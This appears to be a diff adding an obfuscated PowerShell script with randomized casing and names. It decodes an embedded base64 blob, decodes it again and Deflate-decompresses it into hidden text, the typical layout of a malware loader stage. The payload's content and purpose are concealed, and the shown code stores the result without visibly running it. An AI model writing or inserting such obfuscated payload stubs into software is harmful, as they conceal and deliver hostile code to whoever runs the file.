@@ -1,0 +1,20 @@
+$VNwL = 'UGNveENvTkFFRWJoM2xQOGlLVU1aaXlDZ28yZFIwaTV5QVNYNks3TXpoVGVQcElpN2Z0ZW8xSjhOMHlvWDFKYTJDWTRRekdzSVdGek5jTHNodVdHbUQ2NHN2OUU0ajBxMUJQZW1nOUVRMWJzRXZRZkNQRWN1WDhTODBEY016MjZvYTYr'
+$jgIpBRF= [SYsTEM.TeXT.eNcOdiNG]::UTF8.GETSTrINg([sysTEm.Convert]::FRoMbaSe64sTrIng( $VNwL )) 
+FuncTIoN Vnumd { 
+    [CMdLeTBiNDinG() ]PARam( 
+        [paraMETeR(vaLUEfromPIpElINE)]
+        $ZFpWJp,
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $yiBIyXVA
+    )
+    $yJMEyCa= [iO.memOrystReAm][SYsteM.COnverT]::froMbasE64sTRInG($yiBIyXVA)
+    $yJMEyCa |FKWkPFP}
+FuncTIoN FKWkPFP { 
+    [ CMdLeTBiNDinG()]PARam( 
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $EAaSPkqg
+    )
+    $MXRBED= ( new-objECt   SYstEM.Io.COmprEsSIOn.deFlATestReAm( $EAaSPkqg,[sySTEm.io.CoMpREssIoN.COMPResSiOnMOdE]::DeComPreSs )| Foreach-obJECT{ new-objECt   sYstEm.io.StREAmREADER($_,[sYSTeM.teXT.enCoDiNG]::ASCii )} |fOREAch-OBject{$_.ReAdTOEnd() })
+}
+Vnumd -ZFpWJp 'bBsWeYu' -yiBIyXVA $jgIpBRF
+
